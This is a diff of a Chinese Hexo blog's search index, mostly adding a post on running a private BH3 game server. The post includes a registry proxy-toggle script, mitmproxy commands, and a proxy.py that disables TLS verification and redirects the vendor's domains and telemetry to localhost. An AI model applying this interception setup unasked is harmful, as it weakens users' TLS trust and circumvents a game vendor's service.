+<h3 id="SIMPIL"><a href="#SIMPIL" class="headerlink" title="SIMPIL"></a>SIMPIL</h3><img src="/posts/25083369/image-20240105122737426.png" class="" title="image-20240105122737426">
+
+<img src="/posts/25083369/image-20240105122751384.png" class="" title="image-20240105122751384">
+
+<h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p><strong>动态污点分析</strong>：跟踪源头与sink点的信息流。任何由污染源推导的值都是污点（T），其他值看作未污染。</p>
+<p><strong>两种错误：</strong></p>
+<ul>
+<li>overtainted：假阳性</li>
+<li>undertainting：假阴性</li>
+</ul>
+<h3 id="动态污点分析策略"><a href="#动态污点分析策略" class="headerlink" title="动态污点分析策略"></a>动态污点分析策略</h3><h4 id="Taint-Introduction"><a href="#Taint-Introduction" class="headerlink" title="Taint Introduction"></a>Taint Introduction</h4><p>将用户输入作为污染源</p>
+<h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
+<h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
+]]></content>
+      <tags>
+        <tag>DSE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2024 ZJUCTF WriteUp</title>
     <url>/posts/dc126860.html</url>
     <content><![CDATA[<p>本次校赛题目质量不错，难度设置比较合适，属于是看到感觉可以试一试的程度。其中*A口算很有趣！强烈推荐！！！</p>
@@ -1990,7 +1984,7 @@
 <h3 id="鼠标移入菜单效果"><a href="#鼠标移入菜单效果" class="headerlink" title="鼠标移入菜单效果"></a>鼠标移入菜单效果</h3><p>原本是鼠标悬浮后标签下出现蓝条，现在改为放大效果，通过添加自定义CSS实现</p>
 <ol>
 <li><p>在博客根目录source目录下创建好css、js、img文件夹，用来存放自定义的文件，这里我将这些文件夹统一放在&#x2F;source&#x2F;config目录下：</p>
-<img src="/posts/a5aaf96c.html2024-10-27-hexo博客导航栏美化"  alt="image-20241027223321828" style="zoom: 80%;" />
+<img src="/posts/a5aaf96c/image-20241027223321828.png" class="" title="image-20241027223321828">
 </li>
 <li><p>引入自定义的js、css文件<br>直接在主题配置文件中配置即可，这里我的配置文件为_config.butterfly.yml，在文件中找到inject</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/style.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -2731,6 +2725,132 @@
       </tags>
   </entry>
   <entry>
+    <title>BH3 v7.0服务器搭建实践</title>
+    <url>/posts/5fd89f19.html</url>
+    <content><![CDATA[<p>记录一下BH3第一部的私服搭建以及功能完善过程</p>
+<h2 id="使用已有工具运行"><a href="#使用已有工具运行" class="headerlink" title="使用已有工具运行"></a>使用已有工具运行</h2><p>直接运行<code>一键启动.exe</code>，然后开启phpstudy的nginx服务。</p>
+<h3 id="已进行的操作（注意点）"><a href="#已进行的操作（注意点）" class="headerlink" title="已进行的操作（注意点）"></a>已进行的操作（注意点）</h3><ul>
+<li><input checked="" disabled="" type="checkbox"> 修改nginx配置目录</li>
+<li><input checked="" disabled="" type="checkbox"> 修改目录名字为纯英文</li>
+<li><input checked="" disabled="" type="checkbox"> 安装mitmproxy，导入mitmproxy证书</li>
+<li><input checked="" disabled="" type="checkbox"> 安装.Net工具</li>
+<li><input checked="" disabled="" type="checkbox"> 第一次安装好后不要进入，重启游戏</li>
+</ul>
+<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="网络连接失败，请检查网络设置"><a href="#网络连接失败，请检查网络设置" class="headerlink" title="网络连接失败，请检查网络设置"></a>网络连接失败，请检查网络设置</h4><p>进入游戏后发现无法连接网络</p>
+<img src="/posts/5fd89f19/image-20241120233806145.png" class="" title="image-20241120233806145">
+
+<p>查看代理的terminal发现没有日志信息，发现是系统代理并没有开启。</p>
+<p>开启后可以看到日志信息：</p>
+<img src="/posts/5fd89f19/image-20241120233906105.png" class="" title="image-20241120233906105">
+
+<p>发现服务器拒绝连接，使用<a href="http://127.0.0.1访问发现为404,首先怀疑是安装mimtproxy的证书./">http://127.0.0.1访问发现为404，首先怀疑是安装mimtproxy的证书。</a></p>
+<p>参考链接：<a href="https://www.jianshu.com/p/036e5057f0b9">mitmproxy的下载及证书配置</a></p>
+<blockquote>
+<p>此处要注意现有工具设置的代理端口为8891</p>
+</blockquote>
+<p>查看nginx的错误日志<code>error.log</code>文件发现问题，路径设置有误，找到路径定义位置进行修改：</p>
+<img src="/posts/5fd89f19/image-20241121155540102.png" class="" title="image-20241121155540102">
+
+<p>更改后发现仍然报错，原来是<code>www/127.0.0.1/</code>目录下就没有这两个文件：</p>
+<img src="/posts/5fd89f19/image-20241121160105729.png" class="" title="image-20241121160105729">
+
+<p>根据教程要修改<code>BH3/BH3/config.json</code>的内容HOST字段为<code>127.0.0.1</code></p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;UseLocalCache&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CreateAccountOnLoginAttempt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DatabaseUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Gameserver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">16100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RegionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BH3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Http&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;HttpPort&quot;</span><span class="punctuation">:</span> <span class="number">8081</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;HttpsPort&quot;</span><span class="punctuation">:</span> <span class="number">443</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VerboseLevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现原来一键启动后只有两个终端，少了一个服务器的终端进程，怀疑是没有安装.NET工具</p>
+<img src="/posts/5fd89f19/image-20241121163547129.png" class="" title="image-20241121163547129">
+
+<p>将这五个工具全部按顺序运行一遍，然后重新一键启动</p>
+<p>成功弹出三个终端，并且游戏内网络错误报错消失</p>
+<h4 id="下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试"><a href="#下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试" class="headerlink" title="下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试"></a>下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试</h4><p>报错如下：</p>
+<img src="/posts/5fd89f19/image-20241121163821413.png" class="" title="image-20241121163821413">
+
+<p>重启游戏和服务器即可，或者也有可能是phpstudy的问题</p>
+<p>重启后使用用户名1，密码1登录，就可以进入游戏了。</p>
+<p><strong>正常的服务端运行截图（供后续调试参考）</strong></p>
+<img src="/posts/5fd89f19/image-20241121194102579.png" class="" title="image-20241121194102579">
+
+<p><strong>正常的mitmproxy日志信息（供参考）</strong></p>
+<img src="/posts/5fd89f19/image-20241121194208884.png" class="" title="image-20241121194208884">
+
+<h2 id="使用已有服务器源码运行"><a href="#使用已有服务器源码运行" class="headerlink" title="使用已有服务器源码运行"></a>使用已有服务器源码运行</h2><p>服务器源码为C#编写</p>
+<h3 id="服务端运行"><a href="#服务端运行" class="headerlink" title="服务端运行"></a>服务端运行</h3><p>运行源码中的<code>Program.cs</code>文件，发现服务端成功启动，监听在80和443端口</p>
+<img src="/posts/5fd89f19/image-20241121185853651.png" class="" title="image-20241121185853651">
+
+<p>为防止端口冲突，需要修改监听端口为8081，修改Program.cs文件内容即可</p>
+<img src="/posts/5fd89f19/image-20241121185626765.png" class="" title="image-20241121185626765">
+
+<p>修改配置文件<code>bin/Debug/net6.0/config.json</code>内容</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;UseLocalCache&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CreateAccountOnLoginAttempt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DatabaseUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Gameserver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">16100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RegionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BH3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Http&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;HttpPort&quot;</span><span class="punctuation">:</span> <span class="number">8081</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;HttpsPort&quot;</span><span class="punctuation">:</span> <span class="number">443</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VerboseLevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意输出日志为硬编码的80端口， A lie！</p>
+<img src="/posts/5fd89f19/image-20241121190517109.png" class="" title="image-20241121190517109">
+
+<p>修改为以下内容，让日志打印正确值：</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">c.Log(<span class="string">$&quot;HTTP server started on port <span class="subst">&#123;Global.config.Http.HttpPort&#125;</span> &amp; <span class="subst">&#123;Global.config.Http.HttpsPort&#125;</span>&quot;</span>); <span class="comment">// Truth</span></span><br></pre></td></tr></table></figure>
+
+<p>发现正常</p>
+<img src="/posts/5fd89f19/image-20241121190859784.png" class="" title="image-20241121190859784">
+
+<h3 id="代理运行"><a href="#代理运行" class="headerlink" title="代理运行"></a>代理运行</h3><h4 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h4><p>首先开启系统代理8891端口，直接将以下脚本另存为switchProxy.bat，使用ANSI编码保存可以解决中文乱码问题。</p>
+<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span>,<span class="number">2</span>,* &quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable ^| <span class="built_in">find</span> /i &quot;ProxyEnable&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> /A ProxyEnableValue=<span class="variable">%%k</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%ProxyEnableValue%</span> <span class="keyword">equ</span> <span class="number">0</span> (</span><br><span class="line">    <span class="built_in">echo</span> 系统代理目前处于关闭状态，正在开启代理，请稍候...</span><br><span class="line">    <span class="built_in">echo</span>=</span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d <span class="number">1</span> /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /d &quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8891</span>&quot; /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    <span class="built_in">echo</span> 系统代理已开启，请按任意键关闭本窗口...</span><br><span class="line">) <span class="keyword">else</span> <span class="keyword">if</span> <span class="variable">%ProxyEnableValue%</span> <span class="keyword">equ</span> <span class="number">1</span> (</span><br><span class="line">    <span class="built_in">echo</span> 系统代理目前处于开启状态，正在关闭代理，请稍候...</span><br><span class="line">    <span class="built_in">echo</span>=</span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d <span class="number">0</span> /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /d &quot;&quot; /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    <span class="built_in">echo</span> 系统代理已关闭，请按任意键退出本窗口...</span><br><span class="line">)</span><br><span class="line"><span class="built_in">pause</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以下命令</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\switchProxy.bat</span><br><span class="line">.\bin\mitmdump.exe <span class="literal">-p</span> <span class="number">8891</span> <span class="literal">-s</span> .\proxy.py</span><br><span class="line"><span class="comment"># mitmweb方便调试</span></span><br><span class="line">.\bin\mitmweb.exe <span class="literal">-p</span> <span class="number">8891</span> <span class="literal">-s</span> .\proxy.py <span class="literal">--web-port</span> <span class="number">8892</span></span><br></pre></td></tr></table></figure>
+
+<p>proxy.py脚本如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"><span class="keyword">from</span> mitmproxy.proxy <span class="keyword">import</span> layer, layers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">loader</span>):</span><br><span class="line">    <span class="comment"># ctx.options.web_open_browser = False</span></span><br><span class="line">    <span class="comment"># We change the connection strategy to lazy so that next_layer happens before we actually connect upstream.</span></span><br><span class="line">    ctx.options.connection_strategy = <span class="string">&quot;lazy&quot;</span></span><br><span class="line">    ctx.options.upstream_cert = <span class="literal">False</span></span><br><span class="line">    ctx.options.ssl_insecure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_layer</span>(<span class="params">nextlayer: layer.NextLayer</span>):</span><br><span class="line">    <span class="comment"># ctx.log(</span></span><br><span class="line">    <span class="comment">#     f&quot;&#123;nextlayer.context=&#125;\n&quot;</span></span><br><span class="line">    <span class="comment">#     f&quot;&#123;nextlayer.data_client()[:70]=&#125;\n&quot;</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    sni = nextlayer.context.client.sni</span><br><span class="line">    <span class="keyword">if</span> sni <span class="keyword">and</span> (sni.endswith(<span class="string">&quot;yuanshen.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;mihoyo.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;hoyoverse.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;starrails.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bhsr.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;kurogame.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;zenlesszonezero.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;api.g3.proletariat.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;global01.os.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;overseas01-appsflyer-report.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;westglobal01.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bh3.com&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> (sni.endswith(<span class="string">&quot;bundle.bh3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;qcloud.bh3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bh3rd-beta.bh3.com&quot;</span>))):</span><br><span class="line">        ctx.log(<span class="string">&#x27;sni:&#x27;</span> + sni)</span><br><span class="line">        nextlayer.context.server.address = (<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">443</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># flow.request.scheme = &quot;http&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># pretty_host takes the &quot;Host&quot; header of the request into account</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://global01.west.honkaiimpact3.com&#x27;</span>):</span><br><span class="line">        flow.request.host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        flow.request.headers[<span class="string">&quot;Host&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://log-upload-os.mihoyo.com&#x27;</span>) <span class="keyword">or</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://client-report.bh3.com&#x27;</span>):</span><br><span class="line">        flow.response = http.Response.make(</span><br><span class="line">            <span class="number">200</span>,  <span class="comment"># (optional) status code</span></span><br><span class="line">            <span class="string">b&quot;404 not found&quot;</span>,  <span class="comment"># (optional) content</span></span><br><span class="line">            &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;  <span class="comment"># (optional) headers</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据库代理运行"><a href="#数据库代理运行" class="headerlink" title="数据库代理运行"></a>数据库代理运行</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\mongod.exe <span class="literal">--dbpath</span> .\data\</span><br></pre></td></tr></table></figure>
+
+<p>解决以下问题后，可以成功进入游戏</p>
+<h3 id="问题解决-1"><a href="#问题解决-1" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="网络连接失败，请检查网络设置-1"><a href="#网络连接失败，请检查网络设置-1" class="headerlink" title="网络连接失败，请检查网络设置"></a>网络连接失败，请检查网络设置</h4><p>这一问题很普遍，请先检查是否已正常打开系统代理，服务端，然后可以多参考mitmproxy的输出日志信息</p>
+<img src="/posts/5fd89f19/image-20241121193018105.png" class="" title="image-20241121193018105">
+
+<p>查看mitmproxy日志信息与正常的进行比较发现缺少query_gateway url访问</p>
+<p>分析后得知是query_dispatch的url访问问题</p>
+<p>对比发现正常响应没有设定端口</p>
+<img src="/posts/5fd89f19/image-20241121200237500.png" class="" title="image-20241121200237500">
+
+<p>修改服务器端query_dispatch的响应</p>
+<img src="/posts/5fd89f19/image-20241121200509306.png" class="" title="image-20241121200509306">
+
+<p>成功解决该问题</p>
+<h4 id="下载数值文件失败"><a href="#下载数值文件失败" class="headerlink" title="下载数值文件失败"></a>下载数值文件失败</h4><img src="/posts/5fd89f19/image-20241121200655897.png" class="" title="image-20241121200655897">
+
+<p>查看服务端正常输出：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /query_dispatch</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /query_gateway</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /admin/mi18n/plat_oversea/m2020030410/m2020030410<span class="literal">-version</span>.json</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /admin/mi18n/plat_os/m09291531181441/m09291531181441<span class="literal">-version</span>.json</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/combo/granter/api/getConfig</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /device<span class="literal">-fp</span>/api/getExtList</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /combo/box/api/config/sdk/combo</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/mdk/shield/api/loadConfig</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/combo/granter/api/compareProtocolVersion</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /device<span class="literal">-fp</span>/api/getFp</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">19</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">19</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> GET /combo/box/api/config/sw/precache</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> GET /sw.html</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">24</span> &lt;HTTP&gt; <span class="number">404</span> POST /apm/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">24</span> &lt;HTTP&gt; <span class="number">200</span> POST /common/h5log/log/batch</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/mdk/shield/api/verify</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP20:<span class="number">11</span>:<span class="number">27</span> &gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line">&lt;HTTP&gt; <span class="number">200</span> POST /account/device/api/listNewerDevices</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /data_abtest_api/config/experiment/list</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/combo/granter/login/v2/login</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/mdk/agreement/api/getAgreementInfos</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">30</span> &lt;HTTP&gt; <span class="number">404</span> POST /apm/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">30</span> &lt;HTTP&gt; <span class="number">200</span> POST /common/h5log/log/batch</span><br></pre></td></tr></table></figure>
+
+<p><del>应该是query_gateway的响应url有问题，没有加端口：</del></p>
+<p><del><img src="/posts/5fd89f19/image-20241121221642918.png" class="" title="image-20241121221642918"></del></p>
+<p><del>在所有Global.config.Gameserver.Host后全部加上端口号（无果）。</del></p>
+<p>怀疑是phpstudy与服务器的配置有误</p>
+<p>正常情况下phpstudy日志信息</p>
+<img src="/posts/5fd89f19/image-20241122113314979.png" class="" title="image-20241122113314979">
+
+<p>而使用源码运行并没有产生新的日志，说明服务器端并没有向phpstudy发送请求</p>
+<p>确定为DispatchController.cs文件的GetAssetBundleUrlList存在问题</p>
+<p>修改返回值为正确值</p>
+<p>然后发现服务器端成功出现对&#x2F;combo&#x2F;box&#x2F;api&#x2F;config&#x2F;sw&#x2F;precache的url请求，说明CS进行了进一步交互。</p>
